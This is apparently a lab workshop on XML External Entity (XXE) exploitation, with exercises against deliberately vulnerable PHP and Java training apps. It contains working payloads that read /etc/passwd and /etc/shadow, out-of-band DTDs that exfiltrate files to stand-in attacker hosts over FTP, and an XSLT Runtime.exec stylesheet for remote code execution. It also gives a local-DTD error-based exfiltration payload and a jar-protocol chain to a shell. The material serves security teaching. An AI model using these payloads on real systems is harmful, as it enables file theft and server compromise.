id: xxe-workshop
summary: test
authors: Philippe Arteau

# Advanced XXE Exploitation

<!-- =========================== -->

## Introduction
Duration: 00:05:00

Welcome to this 3-hour workshop on XML External Entities (XXE) exploitation!

In this workshop, the latest XML eXternal Entities (XXE) and XML related attack vectors will be presented. XXE is a vulnerability that affects any XML parser that evaluates external entities. It is gaining more visibility with its introduction to the [OWASP Top10 2017 (A4)](https://owasp.org/www-project-top-ten/2017/A4_2017-XML_External_Entities_(XXE).html). You might be able to detect the classic patterns, but can you convert the vulnerability into directory file listing, binary file exfiltration, file write or remote code execution?


The focus of this workshop will be presenting various techniques and exploitation tricks for both PHP and Java applications. Four applications will be at your disposition to test your skills. For every exercise, sample payloads will be given so that the attendees save some time. 

Agenda:
- Basic XXE patterns
- Out-of-bound DTD
- Filter encoding (PHP)
- Local DTD
- Jar protocol and XSLT RCE (Java)

Positive
: For each exercise, detail steps will be given to reproduce the successful attack. Skeleton payloads are also provided on the code repository. In many exercises, a bonus challenge is given.

Positive
: Exercises are independent. Feel free to do them in the order that you prefer.

### Requirements

The requirement is to have a to have an HTTP interception proxy installed.

 - [Burp Suite](https://portswigger.net/burp)
 - [OWASP ZAP](https://portswigger.net/burp)


For the infrastructure, you will need:
 - [Docker](https://www.docker.com/products/docker-desktop)
 - [Java 8+](https://www.oracle.com/java/technologies/javase-jdk11-downloads.html)
 - [Maven](https://maven.apache.org/) (`apt install maven`)
 


Negative
: If you only have a web browser, you won't be able to reproduce the steps provided. You can still follow the workshop by reading the content and watching the demonstrations.

### Deploying Test Applications

In order to do the exercise, you will need to run the [lab applications](https://github.com/GoSecure/xxe-workshop) by yourself. All applications were built with a docker container recipe. This should make the deployment easier.

1. Download the code.
```
$ git clone https://github.com/GoSecure/xxe-workshop
```
2. Read build instructions (`%application_dir%/README.md`) This step will differ for each application.
3. Use docker-compose to start the application.
```
$ docker-compose up
```










<!-- =========================== -->

## XML External Entities 
Duration: 00:05:00

### XML is everywhere

![XML format examples](assets/intro/xml_everywhere.png)

XML documents are used in plenty of file formats. You have probably already edited a configuration file written in XML. If you have built a website, you will edit or see inevitably HTML. You can also think about MS Office documents (`.docx`), Scalable Vector Graphic (`.svg`) and SOAP requests. Being widely implemented in most programming language, it is a excellent choice for interoperability. The [XML standard](https://www.w3.org/TR/xml/) describes many useful formatting features but we are going to focus on "[entities](https://www.w3.org/TR/xml/#sec-entity-decl)" because of the potential vulnerability it introduces.

### What are XML entities?

XML entities are reference to XML data inside of XML documents. We are mentioning XML data because it can be a literal string, XML tags or any legal XML syntax where it is inserted.

**Entity in HTML are used for special characeters**

![Entity 1](assets/intro/entity1.png)

**Entity is being used for a repeated pattern**

![Entity 2](assets/intro/entity2.png)


#### SYSTEM or External entities

![Malicious XXE payload](assets/intro/malicious_payload.png)

When the keyword SYSTEM is added to an entity, it will attempt to load content from the specified URL. The value between quote is the URL. For XML parsing done in a small script execute locally, this seems like a nice feature. However, when the parsing is done server side, the URLs from SYSTEM entities are resolved also on the server. A malicious user could point to a file hosted on the remote server. If the server return the parsing result, the user will suddenly reveal the content of this file.

```xml
<!DOCTYPE data [
<!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<data>&xxe;</data>
```

If the application return the value inside the data node, the content of the file `/etc/passwd` will be reveal.

### Interesting files to read

Passwd is a file that is universally present on Linux operating system.

 - `file:///etc/passwd`
 - `file:///etc/shadow` (Feeling lucky)

Hostnames, DNS resolvers and network devices information can give precious information to discover additional assets. 

 - `file:///etc/hosts`
 - `file:///etc/resolv.conf`
 - `file:///proc/self/net/dev` : Include public and internal IP

 The `/proc` virtual filesystem include various files describing the current process.

 - `file:///proc/self/cwd/FILE` : Relative paths are likely to work. `file:///proc/self/cwd/` is an alternative to `./`.
 - `file:///proc/self/cmdline` : This virtual file is returning the command and the arguments used to start the process.
 - `file:///proc/self/environ` : Environment defined for the context of the current process.


There are few files that are containing the system version. These are also file with no special characters (Useful for testing).

 - `file:///proc/version`
 - `file:///etc/lsb-release`
 - `file:///etc/issue`

For testing purpose, it might be interesting to read virtual file with infinite content. The objective for the attacker would be to either do time based detection or create some sort of Denial of Service (DOS).

 - `file:///dev/urandom` & `file:///dev/zero`











<!-- =========================== -->

## LAB 1: Basic XXE
Duration: 00:10:00

For this first exercise, we are using a website that render Atom feed. The service is at the URL : [http://xxe-workshop.gosec.co:8021](http://xxe-workshop.gosec.co:8021)

![Preview website](assets/exercise1/image4.png)


### Solution

By submitting the form with the news feed (Atom feed) from the sub-reddit netsec.

![Preview website](assets/exercise1/image5.png)

At this point, we can assume that the server is parsing this XML source because we are only seeing one HTTP request in our proxy. The URL could have been fetch from the browser in Javascript but it is not the case here.



#### Serving Your XML Files

For the workshop, you can use your shell to serve HTTP requests. As you can see below, you can start your simple web server with the command : `python -m http.server 8123`.

Negative
: Use a port that is unique. The port chosen may collide with the one from another participant.

![Preview website](assets/exercise1/image6.png)

#### Sending a Basic Payload

It is always best to start with a simple working XML file rather than submit first with a complex and specific payload. Sometime failure to load our XML can be cause by simple syntax issue. XML can be unforgiving regarding the order of XML syntax, mistyped elements and unsupported characters.

![Preview website](assets/exercise1/image9.png)

Once the file is saved, you can submit an URL to this file. The URL must be public.

![Preview website](assets/exercise1/image7.png)

The result page should look like the following. It is a confirmation that our base file is valid. An XML file with a format other than Atom will trigger an error.

![Preview website](assets/exercise1/image8.png)


#### Confirming that XML entities are enabled

Next, we will attempt to fetch a file on the file system with an XML Entities. The Atom should look as follows.

![Preview website](assets/exercise1/image10.png)

As a result, we can see the content of the file `/etc/passwd` in the response.

![Preview website](assets/exercise1/image11.png)

In the source, we can see more easily the content of the file with new lines.

![Preview website](assets/exercise1/image12.png)

Positive
: To complete this exercise, load the file  `/secret/flag.txt`.













<!-- =========================== -->

## Ex-filtration with remote DTD
Duration: 00:05:00

### Out-of-band Exfiltration

XML parsing remotely will not always return content directly. If you are uploading a document such as a data file (`.xml`) or an MS Office document (`.docx`), you might not received the content parse from those documents.

We need to find a way exfiltrate data **during** the parsing. Unfortunately, it is possible refer to an entity from another entity *in the same DOCTYPE*. This limitation comes from the way XML parsers interpret.

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE data [ 
 <!ENTITY file SYSTEM "file:///etc/passwd">
 <!ENTITY notworking SYSTEM "http://xxe.me/&file;">
]>
<data></data>
```
*This payload will not work*

A workaround for this limitation was discovered by the researchers [Alexey Osipov and Timur Yunusov](https://www.youtube.com/watch?v=eBm0YhBrT_c#t=11m51) that allow the construction of URL with data coming from other entities. The first version of this payload uses the Gopher protocol.


![XXE Gopher exfiltration](assets/out-of-bound/external_dtd.gif)

Negative
: In practice, the previous technique is not perfect. Any file with XML incompatible characters (`&`, `\n`, `\x80`, etc) would break the URL. The /etc/issue is one of the rare file safe to include.

The previous technique was [updated with a variant](http://lab.onsec.ru/2014/06/xxe-oob-exploitation-at-java-17.html). This variant replaces Gopher with the FTP protocol. It is very useful because the Gopher is deprecated and only available on [old version of Java](https://bugzilla.redhat.com/show_bug.cgi?id=865541#c0).


The following payload requires a remote DTD file to be hosted on a web server. The DTD file is taking care of doing the concatenation. The final objective is to evaluate `ftp://test:%file;@my.ftp.server/`. The file content is sent as a password.

**payload sent**
```xml
<?xml version="1.0"?>
<!DOCTYPE data [ 
 <!ENTITY % file SYSTEM "file:///etc/passwd">
 <!ENTITY % dtd SYSTEM "http://your.host/remote.dtd"> 
%dtd;]>
<data>&send;</data>
```

**http://your.host/remote.dtd**
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!ENTITY % all "<!ENTITY send SYSTEM 'ftp://test:%file;@my.ftp.server/'>"> %all;
```

In order to capture the file content, you need to record the password sent to your FTP server. To serve this purpose, Ivan Novikov has created [a mock FTP server](http://lab.onsec.ru/2014/06/xxe-oob-exploitation-at-java-17.html) that respond just enough to record password. (FTP client will not authenticate if the handshake is incomplete.)




<!-- =========================== -->

## LAB 2: Exfiltration with remote DTD
Duration: 00:15:00


For this second exercise, we are using a website that render SVG image based on the XML given. The service is at the URL : [http://xxe-workshop.gosec.co:8022](http://xxe-workshop.gosec.co:8022)


![Preview website](assets/exercise2/image4.png)

### Solution

#### First exploration

When reusing the technique we saw in the previous exercise, we can see that the file content is displaying all in one line. This makes it hard to exfiltrate text files. In many real-world cases, the result will simply not display to the user. The parsing will be done and hidden, or done asynchronously.

![Simple XXE test in SVG parser](assets/exercise2/image5.png)

#### Out-of-bound with the FTP protocol

Now, we are going to attempt to exfiltrate the file with the out-of-bound DTD technique. The XML payload will look as follows:

![XML payload XXE out-of-bound](assets/exercise2/image9.png)

The DTD reference in the XML payload is a file that we control. The DTD serve the purpose of concatenation the file content inside a FTP URL.

![XXE DTD with FTP URL](assets/exercise2/image10.png)

Instead of using a real FTP server. We will use a dummy one that responds to few FTP command and will display all content received including the password. We are expecting to receive the file content in the password.

![XXE Dummy FTP](assets/exercise2/image11.png)


#### Sending the XML payload

The payload should look like this.

![XXE Request URL escaped in Burp](assets/exercise2/image14.png)

One easier way to use the encoding tags from the HackVertor plugin. It is a good encoding tool for quickly testing payload without re-encoding the payload on every request.

![XXE Request with Burp HackVertor](assets/exercise2/image15.png)


#### Payload execution

Every step of the XML parsing is susceptible to failed due to small error. If you get result different than the screenshot investigate the potential causes.

First, the DTD is fetch. This confirm that our XML payload is well-formed. If it is not the case, verify the URL you specified in the XML entity.

![XXE HTTP Request Received](assets/exercise2/image13.png)

Second, the FTP is contacted. Confirming that the concatenation succeed.

![XXE FTP Request Received](assets/exercise2/image12.png)


#### Exploring the file system

You can continue exploring the file system by modifying your XML payload and seeing the result on your shell in the dummy FTP server output.

![XXE Exploring file system](assets/exercise2/image16.png)


Positive
: To complete this exercise, load the file `flag.txt` hidden on the server.






<!-- =========================== -->

## Filter encoding
Duration: 00:05:00

### Introduction

We already mentioned the `php://` protocol. This protocol available - of course - only on PHP is providing few options to encode or decode file content.

XXE have major limitations regarding which file can be read. In general, you can't read non-ascii characters or special characters that are not XML compatible. You might have notice when doing the first two exercices.

### Encoding file content

In order to read file with special characters, we can take advantage of the php protocol 

`php://filter/convert.base64-encode/resource=/source_code.zip`

Reference: [php:// - php.net documentation](https://www.php.net/manual/en/wrappers.php.php)

### Other interesting protocols

Here is an exhaustive list of protocols that could be useful when exploiting an XXE.

#### file: protocol

Access file with relative or absolute path

Examples:
 - `file:///etc/passwd`
 - `file://C:/Windows/System32/inetsrv/config/applicationHost.config`



#### http: protocol

Nothing suprising here. You can trigger GET request to HTTP service. While it can be a starting point for Server Side Request Forgery (SSRF), the response is not likely to be readable. Most webpages are not perfectly XML valid.

Example:
 - `https://192.168.0.150:8000/`
 - `https://localhost/phpMyAdmin/`

:negative
`https://169.254.169.254/latest/user-data` AWS metadta URLs now require a special header. It is unlikely that you will be able to access it with an XXE.


#### ftp: protocol

This protocol allows you to connect to a FTP server to read file (would require to know the exact file location and credentials to authenticate) or exfiltrate data (see the next exercise).

Example:
- `ftp://user:password@internal.company.net/file`
- `ftp://user:<data_exfil>@evil.com`

#### gopher: protocol

Another option for data exfiltration is the gopher protocol. It allows to connect to any server with a TCP with an arbitrary message. The path section of the URL is the data that will be written to the TCP socket.
It is rarely available as it require very [old versions of Java](https://bugzilla.redhat.com/show_bug.cgi?id=865541#c0).

- `gopher://server/?data`

#### jar: protocol

The `jar` protocol is a very special case. It is only available on Java applications. It allows to access files inside a PKZIP archive (`.zip`, `.jar`, ...). You will see in the last exercise how it can be used to write file to a remote server.

Example:
- `jar:file://./archive.zip!config.properties`

#### netdoc: protocol

This protocol is alternative to the `file://` protocol. It is of limited use. It is often cited as a method to bypass some WAF blocking for specific string such as `file:///etc/passwd`.

Example:
- `netdoc:///etc/passwd`


<!-- =========================== -->

## LAB 3: Filter encoding
Duration: 00:15:00

For this third exercise, we are using a website that is very similar to the first exercise. It is also parsing Atom feed. It is however using a different language : PHP. The service is at the URL : [http://xxe-workshop.gosec.co:8022](http://xxe-workshop.gosec.co:8022)

![Preview website](assets/exercise3/image4.png)

### Solution

#### Using a PHP filter

Similarly to the first exercise, we are going to host a malicious Atom feed on a web server. This XML document will use PHP base64-encoding filter inside an XML entitiy.

![XXE PHP filter payload](assets/exercise3/image5.png)

The response will be in Base64 because, this is what we instruct the server to do with the filter. To read the original content, we can decode it with a variety of decoding tools. In Burp, you can press **Ctrl-B** to decode your selection.

![XXE Decoding the Base64 response in Burp](assets/exercise3/image6.png)


Positive
: To read the `.svn/wc.db`, you have two options. You can either loaded it with a sqlite client or simply look at it in a text editor. The first option would scale better with large repository history.


#### Hidden page

The SVN metadata file revealed us that a PHP script was present at `/test_dev.php`.

![Hidden page found](assets/exercise3/image7.png)

We can use the same filter technique to view the source code of this page. Here is the payload.

![Viewing PHP source](assets/exercise3/image8.png)

When the response is received, we can decode the base 64 blob to view the PHP source. 

![Decoding the Base64 response in Burp](assets/exercise3/image9.png)

Positive
:  **Can you spot the vulnerability?** <br/> You can now review the source of the developper script. You should be able to find an additionnal vulnerability (unrelated to XXE) that will give you remote code execution.


Positive
:  To complete this exercise, load the file `flag.txt` hidden on the server.








<!-- =========================== -->

## Jar protocol
Duration: 00:05:00

### jar: purpose

The `jar` protocol is only available on Java applications. It allows to access file inside a PKZIP file (`.zip`, `.jar`, ...).


It works for local file..
```xml
jar:file:///var/myarchive.zip!/file.txt
```

And with remote file..
```xml
jar:https://download.host.com/myarchive.zip!/file.txt
```

### Behind the scene

What is happening behind the scene with the HTTP URL with a remote ZIP? There are in fact multiple steps that lead to the file being extracted.

1. It does an HTTP request to load the zip archive. `https://download.host.com/myarchive.zip`
2. It save the HTTP response to a temporary location. `/tmp/...`
3. It extract of the archive.
4. It reads the `file.zip`
5. It delete the temporary files.

What if we manage to stop the sequence at the second step?.. It is possible to do so!

### Complement: XSLT

Positive
: This segment is required for the next exercise. This vector is not consider an XXE as it focus on a different feature of XML.

Extensible Stylesheet Language Transformations (or XSLT) is a text format that describe the transformation applied to XML documents. The official specification provide basic transformation. Language such as Java and .NET have introduce extension to allow invocation of method from the stylesheet. The Java implementation is more prone to vulnerability being enable by default. It has the capability to access all class in the classpath.

If you are seeing a feature that allow you to configure an XSLT file in a Java application, it is likely to trigger remote code execution.

```xml
<xsl:stylesheet version="1.0"
xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
xmlns:date="http://xml.apache.org/xalan/java/java.util.Date"
xmlns:rt="http://xml.apache.org/xalan/java/java.lang.Runtime"
xmlns:str="http://xml.apache.org/xalan/java/java.lang.String"
exclude-result-prefixes="date">
    <xsl:output method="text"/>
    <xsl:template match="/">
    <xsl:variable name="cmd"><![CDATA[touch /tmp/test1234]]></xsl:variable>
    <xsl:variable name="rtObj" select="rt:getRuntime()"/>
    <xsl:variable name="process" select="rt:exec($rtObj, $cmd)"/>
    <xsl:text>Process: </xsl:text><xsl:value-of select="$process"/>
    </xsl:template>
</xsl:stylesheet>
```

In the root node, classes (`java.lang.Runtime` and `java/java.lang.String`) are imported for future reference. To customize the previous payload, you need to edit the assignment `<xsl:variable name="cmd"><![CDATA[touch /tmp/test1234]]></xsl:variable>`. The touch command can be replace with any command available on the server.

<!-- =========================== -->

## LAB 4: Jar protocol
Duration: 00:15:00

![Preview website](assets/exercise4/image4.png)


### Solution


#### Generating a script

To exploit this service, we will need to evaluate multiple URLs with the same XXE base payload. To send those similar request, we can encapsule the logic inside a script.

Here is demonstration of the Burp plugin [Reissue Request Scripter](https://portswigger.net/bappstore/6e0b53d8c801471c9dc614a016d8a20d). The request exported is the POST request to `/admin/upload`. 

Negative
: Make sure to submit the form in order to see the request in your Burp history.

![Generating script in Burp](assets/exercise4/image5.png)

![Generated script in Burp](assets/exercise4/image6.png)


#### Configuring the exploit script

For this exercise, an exploit script is provided to you. The only segment to edit is the session cookie.

![Editing generated script](assets/exercise4/image7.png)


You can test that the script is working properly by evaluating a test file. The script has only one argument the file to evaluate (`python exploit.py [FILE]`). In the capture below, we are executing `python exploit.py /etc/issue`.

![Launching XXE script](assets/exercise4/image8.png)

#### Exploiting with the jar protocol


In order to persist a file more than a second, we must serve the file with a web server that will hold connection as long as possible. A simple Tornado server is provided in the workshop repository. You can see in the script that a call to the `sleep` function is done to prevent the closed connection when the function return. As soon as the connection would closed, the Java application would attempt to extract the ZIP and dispose the file leaving us no time to use the file writen to disk.

![Slow HTTP server script](assets/exercise4/image9.png)

The file that will be served is malicious stylesheet. For more information, refer to the previous section.

In the following stylesheet, we are invoking the methods `Runtime.getRuntime().exec("/bin/busybox ....")`.

![XSLT payload](assets/exercise4/image13.png)


#### Putting the pieces togetter

**Step 1: The "slow" HTTP server**

![Slow HTTP server](assets/exercise4/jar_slow_server.png)

**Step 2: Uploading our file**

![Slow HTTP server](assets/exercise4/jar_upload.png)

**Step 3: Browsing to find the full path of the file**

![Slow HTTP server](assets/exercise4/jar_browse.png)


**Step 4: Exploit path traversal**

![Path traversal Burp](assets/exercise4/image15.png)

**Step 5: Interact with shell**

![NC Shell](assets/exercise4/image16.png)


Negative
: Make sure that your file was written to disk before attempting the path traversal.









<!-- =========================== -->

## Exfiltration with local DTD
Duration: 00:05:00

### The problem

If the **XML parsed is not returned** and **the network side-channel are not possible** (aggressive network filter), would the XML parser be vulnerable in this case? This case was for a few years consider unexploitable.

### Error-based exfiltration

![Filename exception](assets/local-dtd/filename_exception.png)

One of the remaining channel is the error messages. This channel is available if the application is configured to returned detail error messages.

### Method without external DTD

Can we do a concatenation trick without external DTD ? The short answer to the problem is: Yes we can! 
Arseniy Sharoglazov found [an interesting technique that allows us to use an local DTD instead of an external DTD](https://mohemiv.com/all/exploiting-xxe-with-local-dtd-files/).


We need to find an entity that is declared and use in the same DTD. Here is an example taken from `/usr/share/xml/fontconfig/fonts.dtd`.
```xml
[…]
<!ENTITY % constant '>[MALICIOUS]<!ELEMENT dummy(123 '>
<!ELEMENT patelt (%constant;)*>
[…]
```

If we replace the `constant` entity by the following XML injection. It would allows us to evaluate arbirary XML. Our objective is going to do a concatenation within this injection point.
```xml
<!ENTITY % constant '>[MALICIOUS]<!ELEMENT dummy(123 '>

<!ELEMENT patelt (%constant;)*>
```

The malicious XML we are looking to inject in the `[MALICIOUS]` placeholder is the following:
```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
```

When `%eval` will be evaluated the concatenation will occurs.

### Overview

In summary, here are the steps that will be needed during the XML parsing:

1. Initialize local DTD
2. Overrides one of its entity (replace the entity)
3. Evaluate ELEMENT and ENTITY from the local DTD

The final evaluation should trigger the injection of new entities doing
the same concatenation trick used in external DTD.


### Final payload

The payload we are going to send will look like this:

```xml
<!DOCTYPE message [
    <!ENTITY % local_dtd SYSTEM "file:///usr/share/xml/fontconfig/fonts.dtd">

<!ENTITY % constant '><!ENTITY &#x25; file SYSTEM
"file:///etc/passwd"> <!ENTITY &#x25; eval "<!ENTITY
&#x26;#x25; error SYSTEM
&#x27;file:///nonexistent/&#x25;file;&#x27;>"><!ELEMENT
dummy(123 '>
<!ELEMENT patelt (%constant;)*>


    %local_dtd;
]>
<message></message>
```

To see it in action, pass to the next section.

If you want to know more about the different injection patterns, visit this blog post: [Automating local DTD discovery for XXE exploitation
](https://www.gosecure.net/blog/2019/07/16/automating-local-dtd-discovery-for-xxe-exploitation/).

<!-- =========================== -->

## LAB 5: Exfiltration with local DTD
Duration: 00:15:00

![Preview website](assets/exercise5/image4.png)


### Solution

#### Triggering a FileNotFoundException

At first, we need to build a base payload that simply trigger a `FileNotFoundException`. We need to confirm that error message are returned to the client.

![Burp request file not found](assets/exercise5/image9.png)


#### Using Intruder to Brute Force DTD

In order to find if at least one interesting DTD is present on the remote server, we are going to need to brute-force it with a [huge list of potential paths](https://raw.githubusercontent.com/GoSecure/dtd-finder/master/list/dtd_files.txt).

![Request to intruder](assets/exercise5/image12.png)

The content that will change in our request is the path. The XML around this path will not change and it needs to be URL encoded.

![Request to intruder prefix suffix](assets/exercise5/image13.png)


#### Filtering attempt

Once Intruder is done with the brute force attack, we can filter result with a negative search.

![Intruder filter](assets/exercise5/image14.png)

Intruder is not showing the initial value from our list, but the final value encoded. For this reason, we need to decode the path from the request.

![Intruder result decoding url](assets/exercise5/image15.png)

#### Using the DTD found

Once a DTD with a known *overridable* entity is found, we can start to poke at files to exfiltrate.

You can reuse a XXE payload from [this list](https://github.com/GoSecure/dtd-finder/blob/master/list/xxe_payloads.md). Only the `file` entity need to be change. The path to the DTD (`local_dtd`) and the dummy path (`/nonexistant`) will be unmodified.

![File content received](assets/exercise5/image11.png)


You can view the complete attack in this video.

<video id="lGz5MOUz7Ws"></video>





<!-- =========================== -->

## Conclusion
Duration: 00:01:00

Misconfigured XML parser can open doors to attackers. Being able to read files on the vulnerable server is the main consern. But as you saw in this workshop, being able to read key files can lead to escalating to remote command execution.

From a developper perspective, you can prevent such issue by configuring properly the XML parser in used in your application. Few librairies have secure configuration by default but it is best to verify with a reference such as the OWASP Cheat Sheet in the reference below.


### References

 - [Example with jar: protocol trick](http://www.agarri.fr/kom/archives/2013/11/27/compromising_an_unreachable_solr_server_with_cve-2013-6397/index.html)
 - [Example of simple payload and out-of-bound](http://blog.h3xstream.com/2014/06/identifying-xml-external-entity.html)
 - [XML Schema, DTD, and Entity Attacks](http://vsecurity.com/download/papers/XMLDTDEntityAttacks.pdf)
 - [More examples (Huge list of payload variations)](https://web-in-security.blogspot.com/2016/03/xxe-cheat-sheet.html)
- [XXE: How to become a Jedi](https://www.slideshare.net/ssuserf09cba/xxe-how-to-become-a-jedi) Many exploitation tips
- [XXE: The Anatomy of an XML Attack](https://www.owasp.org/images/3/30/XXE_-_The_Anatomy_of_an_XML_Attack_-_Mike_Felch.pdf): Good presentation (list of protocols taken from this one)
- [OWASP: XML External Entity Prevention Cheat Sheet](https://www.owasp.org/index.php/XML_External_Entity_(XXE)_Prevention_Cheat_Sheet)

